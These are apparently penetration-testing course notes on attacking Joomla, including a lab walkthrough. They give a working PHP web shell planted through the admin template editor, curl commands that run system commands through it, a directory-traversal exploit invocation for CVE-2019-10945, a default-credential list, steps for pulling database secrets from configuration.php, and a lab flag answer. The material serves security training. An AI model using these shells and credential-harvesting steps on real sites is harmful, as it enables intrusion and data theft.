# Section 6 — Attacking Joomla

Two reliable Joomla attack paths:

```
1. Authenticated → Templates editor → PHP RCE   (always works with admin creds)
2. CVE-2019-10945 → dir traversal → read config/flag files (Joomla ≤ 3.9.4)
```

---

## 1 — Template Editor RCE (Authenticated)

### Steps
1. Log in to `/administrator/`
2. **Extensions → Templates → Templates** (or sidebar: Configuration → Templates)
3. Click a template name — choose **Protostar** (or any inactive template)
4. Click `error.php` (non-obvious name, low traffic)
5. Add PHP one-liner **inside** the file, e.g.:
   ```php
   system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
   ```
   Use a non-obvious parameter name to reduce "drive-by" exploitation risk.
6. Click **Save & Close**
7. Trigger:
   ```bash
   curl -s "http://target/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id"
   # uid=33(www-data) gid=33(www-data) groups=33(www-data)
   ```

### Template path pattern
```
/templates/<template-name>/error.php
```

### Cleanup (mandatory — add to report appendix)
- Remove PHP one-liner from `error.php` via template editor
- Document in report: file name, hash, location, timestamp, confirmed removal

### Troubleshooting
If control panel shows "Call to a member function format() on null" after login:
→ Go to `?option=com_plugins` → disable **"Quick Icon - PHP Version Check"** plugin

---

## 2 — CVE-2019-10945 (Directory Traversal + File Deletion)

**Affects:** Joomla 1.5.0 – 3.9.4  
**Auth required:** Yes (admin credentials)  
**Impact:** Read arbitrary paths accessible to web user; delete files (don't do this)

### Use case
- When the admin portal isn't exposed externally (can't get RCE directly)
- Useful for reading `configuration.php` — may contain DB credentials
- List webroot to find flag/config files

### Exploit

```bash
# Python2 version (module text):
python2.7 joomla_dir_trav.py \
  --url "http://target/administrator/" \
  --username admin \
  --password admin \
  --dir /

# Python3 version available separately
```

### What it finds
Lists directory contents (not file contents). Combine with curl to read interesting files:
```bash
# configuration.php is almost always in webroot
curl -s http://target/templates/protostar/error.php?cmd=cat+/var/www/dev.inlanefreight.local/configuration.php
# OR access config directly if readable (usually not via HTTP — it's PHP)
```

### configuration.php secrets
The Joomla config file typically contains:
```php
public $db = 'joomla';
public $user = 'joomlauser';
public $password = 'JoomlaPass!';
public $secret = '...'
```
→ Database creds usable for pivoting to MySQL, or password reuse

---

## Default Creds to Try

| Username | Password | Notes |
|----------|----------|-------|
| `admin` | `admin` | Most common default (set at install) |
| `admin` | `password` | Common weak choice |
| `admin` | `turnkey` | Seen in HTB labs |
| `admin` | `joomla` | Theme/install-specific |

---

## Lab Walkthrough (`dev.inlanefreight.local`)

Joomla version: **3.9.4** — vulnerable to CVE-2019-10945 (dir traversal).  
Credentials: `admin:admin`

### Q1 — Flag in webroot

`joomla_dir_trav.py` isn't on Kali. Use template editor RCE instead:

```bash
# 1. Log in as admin
# 2. Go to Extensions → Templates → Protostar → error.php
# 3. Insert shell BEFORE the defined('_JEXEC') or die; line
#    (appending after JEXEC kills direct access — shell never runs)
#    Modify: <?php\n → <?php\nsystem($_GET["shell"]);\n

# 4. Trigger shell
curl -s "http://dev.inlanefreight.local/templates/protostar/error.php?shell=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

# 5. List webroot
curl -s "http://dev.inlanefreight.local/templates/protostar/error.php?shell=ls+-la+/var/www/dev.inlanefreight.local/"
# flag_6470e394cbf6dab6a91682cc8585059b.txt

# 6. Read flag
curl -s "http://dev.inlanefreight.local/templates/protostar/error.php?shell=cat+/var/www/dev.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt"

# 7. Restore error.php via template editor — verify shell gone (0 bytes response)
```

**JEXEC gotcha:** Joomla template files have `defined('_JEXEC') or die;` near the top. Appending a shell at the end = empty response on direct access. Must insert shell BEFORE that line (right after `<?php`).

**Answer:** `j00mla_c0re_d1rtrav3rsal!`

---

## Exam Notes

- Template editor RCE = fastest path when admin creds are known — always try first
- Use non-obvious shell parameter names (avoid `cmd`, `c`, `exec`) — reduces noise
- CVE-2019-10945 lists paths but doesn't read file contents — combine with template shell or LFI to read
- `configuration.php` is the Joomla equivalent of `wp-config.php` — always worth reading for DB creds
- Joomla template path: `/templates/<template>/` — files are directly accessible via HTTP
- If dir traversal script is unavailable on Kali, replicate via authenticated template RCE instead
- Cleanup: always restore `error.php` to original state; log in report appendix
